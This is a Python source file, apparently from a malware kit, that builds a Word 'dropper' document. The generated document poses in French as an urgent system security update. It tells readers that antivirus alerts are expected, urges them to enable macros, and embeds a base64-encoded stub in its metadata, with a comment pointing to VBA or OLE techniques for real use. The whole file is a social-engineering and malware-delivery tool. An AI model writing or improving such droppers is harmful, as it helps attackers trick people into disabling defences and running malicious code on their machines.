# documents/word_dropper/generate_doc.py
from docx import Document
from docx.shared import Inches
import os
import base64

class WordDropperGenerator:
    def __init__(self):
        self.template_path = "resources/templates/document_template.docx"
        
    def generate(self, stub_path, output_dir):
        """Génère un document Word avec le stub embedé"""
        try:
            # Création du document
            doc = Document()
            
            # Ajout du contenu légitime
            self._add_legitimate_content(doc)
            
            # Embedding du stub
            self._embed_stub(doc, stub_path)
            
            # Sauvegarde
            output_path = os.path.join(output_dir, "word_dropper.docx")
            doc.save(output_path)
            
            return output_path
            
        except Exception as e:
            raise Exception(f"Word document generation failed: {str(e)}")
            
    def _add_legitimate_content(self, doc):
        """Ajoute du contenu légitime pour paraître normal"""
        # Titre
        title = doc.add_heading('Document Important - Mise à jour de sécurité', 0)
        
        # Paragraphes
        doc.add_paragraph(
            'Ce document contient des informations importantes concernant '
            'la mise à jour de sécurité de votre système. Veuillez suivre '
            'les instructions ci-dessous pour garantir la sécurité de vos données.'
        )
        
        doc.add_paragraph(
            'Pour des raisons de sécurité, ce document peut déclencher des '
            'alertes de votre antivirus. Ceci est normal et attendu pour ce '
            'type de mise à jour système.'
        )
        
        # Ajout d'un tableau factice
        table = doc.add_table(rows=3, cols=2)
        table.style = 'Table Grid'
        
        cells = table.rows[0].cells
        cells[0].text = 'Version'
        cells[1].text = '2024.06.21'
        
        cells = table.rows[1].cells
        cells[0].text = 'Criticité'
        cells[1].text = 'Haute'
        
        cells = table.rows[2].cells
        cells[0].text = 'Redémarrage requis'
        cells[1].text = 'Oui'
        
    def _embed_stub(self, doc, stub_path):
        """Embed le stub dans le document (technique VBA ou OLE)"""
        # Lecture du stub
        with open(stub_path, 'rb') as f:
            stub_data = f.read()
            
        # Encodage en base64 pour embedding
        encoded_stub = base64.b64encode(stub_data).decode()
        
        # Ajout comme propriété custom (technique d'embedding simple)
        # En production, utiliser des techniques plus sophistiquées (VBA, OLE, etc.)
        doc.core_properties.comments = f"UpdateData:{encoded_stub[:1000]}..."  # Tronqué pour l'exemple
        
        # Ajout d'instructions pour l'utilisateur
        doc.add_paragraph(
            '\n\nPour appliquer cette mise à jour, veuillez activer les macros '
            'si demandé et redémarrer votre ordinateur après installation.'
        )